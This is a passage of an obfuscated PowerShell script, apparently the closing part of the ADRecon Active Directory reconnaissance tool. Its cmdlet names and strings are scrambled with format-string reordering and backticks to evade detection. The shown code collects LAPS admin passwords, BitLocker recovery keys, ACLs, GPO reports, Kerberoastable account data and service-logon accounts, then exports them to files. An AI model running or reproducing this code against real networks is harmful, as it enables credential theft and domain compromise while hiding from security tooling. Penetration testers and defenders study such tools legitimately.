            ${a`drO`BJeCT} = &("{1}{2}{0}"-f'APS','Ge','t-ADRL') -Method ${Met`HOD} -objDomain ${o`BJDOM`A`iN} -PageSize ${P`A`GeSizE} -Threads ${tH`R`eADS}
        }
        Else
        {
            &("{3}{2}{1}{0}" -f'ng','rni','a','Write-W') ("{6}{1}{0}{3}{2}{5}{4}" -f ' ','S','s','i','lemented.',' not imp','[*] LAP')
        }

        If (${Ad`Robj`ect})
        {
            &("{2}{0}{1}" -f'o','rt-ADR','Exp') -ADRObj ${ad`RobJ`ect} -ADROutputDir ${AdROUtp`UT`DIR} -OutputType ${OU`TPUt`TY`PE} -ADRModuleName ("{1}{0}" -f'APS','L')
            &("{0}{4}{2}{3}{1}"-f 'R','e','ri','abl','emove-Va') ("{2}{1}{0}" -f 'ject','Ob','ADR')
        }
        &("{3}{2}{1}{0}" -f 'iable','ar','-V','Remove') ("{0}{1}{2}" -f'A','D','RLAPS')
    }
    If (${aDrbI`TLo`ck`er})
    {
        &("{1}{2}{0}{3}" -f'-O','Wri','te','utput') ("{7}{8}{3}{10}{6}{14}{4}{0}{13}{9}{5}{12}{15}{1}{2}{11}"-f 'v','eged',' Acc','tLock','o','d','r Re','[-] B','i','ry Keys - Nee','e','ount','s P','e','c','rivil')
        ${aD`Ro`BJE`cT} = &("{2}{1}{0}"-f'ocker','-ADRBitL','Get') -Method ${Me`T`HOD} -objDomain ${oBJ`dO`m`Ain} -DomainController ${d`oMAI`NcoNtRoLL`er} -Credential ${cr`eD`eNTIAl}
        If (${A`DRo`BJEcT})
        {
            &("{1}{2}{0}"-f 'DR','Exp','ort-A') -ADRObj ${ADr`Obje`cT} -ADROutputDir ${AdR`oUtPUt`DIR} -OutputType ${OU`TPU`TTYPE} -ADRModuleName ("{4}{2}{1}{3}{0}"-f 'eryKeys','Locke','it','rRecov','B')
            &("{2}{3}{1}{0}"-f'e','bl','Remove-Var','ia') ("{2}{0}{1}" -f 'ec','t','ADRObj')
        }
        &("{0}{2}{1}{3}{4}" -f'Re','V','move-','a','riable') ("{1}{2}{3}{0}"-f 'ocker','AD','RB','itL')
    }
    If (${A`dR`AclS})
    {
        &("{2}{0}{3}{1}"-f 'ite-Ou','t','Wr','tpu') ("{5}{0}{2}{1}{4}{6}{3}{7}"-f']','Ls',' AC','some t',' - M','[-','ay take ','ime')
        ${A`DROb`j`ect} = &("{1}{2}{0}" -f 'CL','Get-','ADRA') -Method ${me`THoD} -objDomain ${ob`jdOM`Ain} -DomainController ${DO`mai`N`cONtroLleR} -Credential ${c`Red`entIAl} -PageSize ${p`Ages`izE} -Threads ${Thr`E`Ads}
        &("{1}{3}{2}{4}{0}"-f'ble','Rem','e-','ov','Varia') ("{0}{1}{2}"-f 'ADR','AC','Ls')
    }
    If (${a`drGpO`Re`porT})
    {
        &("{0}{1}{3}{2}"-f 'Wri','te-Ou','put','t') ("{3}{0}{9}{2}{10}{6}{8}{4}{1}{5}{7}" -f ' ','me','Re','[-]','take so',' ','ort -','time',' May ','GPO','p')
        &("{2}{0}{1}{4}{3}" -f'P','ORe','Get-ADRG','ort','p') -Method ${METH`oD} -UseAltCreds ${UsE`ALt`Cr`eDS} -ADROutputDir ${ADROUt`pu`TD`iR}
        &("{1}{2}{3}{0}" -f 'Variable','R','emo','ve-') ("{3}{2}{1}{0}"-f 'ort','ORep','GP','ADR')
    }
    If (${adRK`E`RBeRo`A`St})
    {
        &("{0}{2}{1}" -f 'Write-O','ut','utp') ("{3}{0}{1}{2}" -f'] Kerber','oa','st','[-')
        ${adROBj`e`CT} = &("{3}{1}{2}{0}{4}"-f 'ro','DRKer','be','Get-A','ast') -Method ${mET`HOD} -objDomain ${O`Bjdom`Ain} -Credential ${c`REd`EN`TIal} -PageSize ${p`Ag`ESiZe}
        If (${A`DRobJ`ECt})
        {
            &("{0}{1}{2}"-f'E','xport-A','DR') -ADRObj ${adR`OBJe`cT} -ADROutputDir ${a`d`ROU`T`PutDiR} -OutputType ${oU`TPUTt`yPe} -ADRModuleName ("{1}{2}{0}{3}"-f 'oas','Ke','rber','t')
            &("{2}{3}{0}{1}" -f'a','ble','Remove-','Vari') ("{0}{2}{1}" -f 'AD','bject','RO')
        }
        &("{0}{1}{2}{3}"-f 'Remove','-Va','ri','able') ("{3}{0}{2}{1}"-f'DRK','roast','erbe','A')
    }
    If (${a`dR`D`oM`AINAccOunTsUSE`dForSe`R`Vi`ce`lo`gOn})
    {
        &("{2}{1}{0}{3}" -f 'ite-Outpu','r','W','t') ("{4}{0}{7}{9}{5}{6}{12}{2}{8}{11}{13}{1}{10}{3}" -f'-]','vil','vice Logon - N','ccount','[','ounts used ','fo',' Domai','ee','n Acc','eged A','ds Pr','r Ser','i')
        ${aDr`oBJe`ct} = &("{4}{0}{1}{2}{6}{3}{5}" -f'DRDo','mai','nAccou','susedforS','Get-A','erviceLogon','nt') -Method ${MeT`h`od} -objDomain ${ob`JDOma`in} -Credential ${C`R`eD`entIal} -PageSize ${PagES`i`ZE} -Threads ${ThRea`Ds}
        If (${ADRO`BjE`cT})
        {
            &("{2}{0}{1}" -f 'or','t-ADR','Exp') -ADRObj ${AD`RoBj`Ect} -ADROutputDir ${ADROu`TPuT`d`iR} -OutputType ${OU`Tp`UtTyPe} -ADRModuleName ("{2}{6}{3}{4}{0}{5}{1}" -f 'ice','n','Do','AccountsusedforSe','rv','Logo','main')
            &("{0}{1}{2}{4}{3}"-f 'Re','m','ov','e','e-Variabl') ("{1}{0}{2}"-f'bje','ADRO','ct')
        }
        &("{2}{1}{3}{0}" -f 'le','-Var','Remove','iab') ("{1}{0}{6}{2}{4}{5}{3}" -f 'nA','ADRDomai','tsusedf','viceLogon','o','rSer','ccoun')
    }

    ${tO`TA`LtIme} = "{0:N2}" -f ((&("{2}{1}{0}{3}"-f'teD','Da','Get-','iff') -Date1 (&("{2}{1}{0}"-f 'Date','et-','G')) -Date2 ${d`Ate})."tO`TaLm`inuTes")

    ${AB`oUtadR`e`coN} = &("{1}{0}{2}"-f't-ADRAbou','Ge','t') -Method ${meTh`Od} -date ${DA`Te} -ADReconVersion ${AD`RECoNve`RS`Ion} -Credential ${cr`EdENti`AL} -RanonComputer ${rANoN`ComPU`Ter} -TotalTime ${tota`LT`IMe}

    If ( (${ouT`PutTy`pe} -Contains "CSV") -or (${outP`U`TT`yPE} -Contains "XML") -or (${ou`TPu`TTY`pE} -Contains ("{1}{0}" -f 'ON','JS')) -or (${OUt`pU`TtyPe} -Contains ("{1}{0}" -f 'TML','H')) )
    {
        If (${AboutADre`C`oN})
        {
            &("{2}{1}{0}"-f '-ADR','rt','Expo') -ADRObj ${A`BoutAD`RE`con} -ADROutputDir ${Adr`O`UtPUT`D`Ir} -OutputType ${OUT`pUT`TYpE} -ADRModuleName ("{2}{1}{0}"-f 'on','ADRec','About')
        }
        &("{3}{2}{0}{1}" -f'p','ut','te-Out','Wri') "[*] Total Execution Time (mins): $($TotalTime) "
        &("{0}{2}{1}" -f 'Write-Out','ut','p') ('[*]'+' '+'Output'+' '+'Direc'+'tor'+'y:'+' '+"$ADROutputDir")
        ${a`dRs`TdOuT} = ${fa`LSE}
    }

    Switch (${o`UtPUtTy`pe})
    {
        ("{1}{0}" -f 'OUT','STD')
        {
            If (${A`drSt`D`OuT})
            {
                &("{0}{1}{2}" -f 'Write','-O','utput') "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ("{0}{1}" -f 'HTM','L')
        {
            &("{0}{2}{1}"-f'E','ADR','xport-') -ADRObj $(&("{2}{0}{1}" -f 'b','ject','New-O') ("{1}{0}" -f't','PSObjec')) -ADROutputDir ${adR`outPUt`DiR} -OutputType $([array] ("{0}{1}"-f 'HTM','L')) -ADRModuleName ("{1}{0}"-f'ndex','I')
        }
        ("{1}{0}"-f'XCEL','E')
        {
            &("{1}{0}{2}{3}"-f'-','Export','A','DRExcel') -ExcelPath ${AdrO`UTp`U`TdiR} -Logo ${l`ogO}
        }
    }
    &("{4}{3}{1}{0}{2}" -f'-Varia','ve','ble','emo','R') ("{0}{1}{2}"-f'T','ota','lTime')
    &("{1}{0}{2}{3}"-f'-Var','Remove','iabl','e') ("{0}{1}{2}" -f 'AboutADR','e','con')
    &("{1}{2}{0}" -f'tion','Set-Lo','ca') ${r`ETuRnD`Ir}
    &("{0}{1}{2}" -f 'Remo','ve-Vari','able') ("{1}{0}{2}"-f'eturndi','r','r')

    If ((${m`ET`HOd} -eq ("{1}{0}"-f 'S','ADW')) -and ${us`e`ALTC`ReDs})
    {
        &("{1}{0}{4}{2}{3}" -f'em','R','Dri','ve','ove-PS') ("{1}{0}" -f 'DR','A')
    }

    If (${MeT`HoD} -eq ("{1}{0}"-f 'DAP','L'))
    {
        ${ObJ`Doma`in}.("{1}{0}" -f'ispose','D').Invoke()
        ${OBjDo`mainR`OoT`DSE}.("{1}{0}" -f 'ispose','D').Invoke()
    }

    If (${AdR`O`UtP`U`TdIr})
    {
        &("{6}{1}{2}{0}{4}{3}{5}" -f'DRO','pty','A','tDi','utpu','r','Remove-Em') ${Adro`U`T`PutD`IR} ${o`Utputt`Ype}
    }

    &("{1}{3}{4}{0}{2}"-f'ari','Rem','able','ove-','V') ("{1}{2}{3}{0}" -f'n','ADRec','onVers','io')
    &("{1}{2}{4}{3}{0}" -f 'e','Rem','o','bl','ve-Varia') ("{2}{0}{1}" -f 'Co','mputer','Ranon')
}

If (${l`OG})
{
    &("{4}{0}{2}{3}{1}" -f '-Tra','ipt','nsc','r','Start') -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

&("{1}{0}{2}"-f'oke-ADReco','Inv','n') -GenExcel ${GeneX`C`el} -Method ${Me`T`Hod} -Collect ${c`o`LlecT} -DomainController ${dOMaI`N`ConT`Ro`LL`ER} -Credential ${c`REDE`NTIal} -OutputType ${oUt`putt`y`pE} -ADROutputDir ${outP`U`Tdir} -DormantTimeSpan ${dO`RMAnttIme`SpaN} -PassMaxAge ${PASs`M`AXage} -PageSize ${pAGes`IZE} -Threads ${t`HrE`ADS} -OnlyEnabled ${ONL`Ye`NAbLeD} -Logo ${L`OgO}

If (${l`og})
{
    &("{4}{1}{3}{0}{2}" -f 'cr','n','ipt','s','Stop-Tra')
}
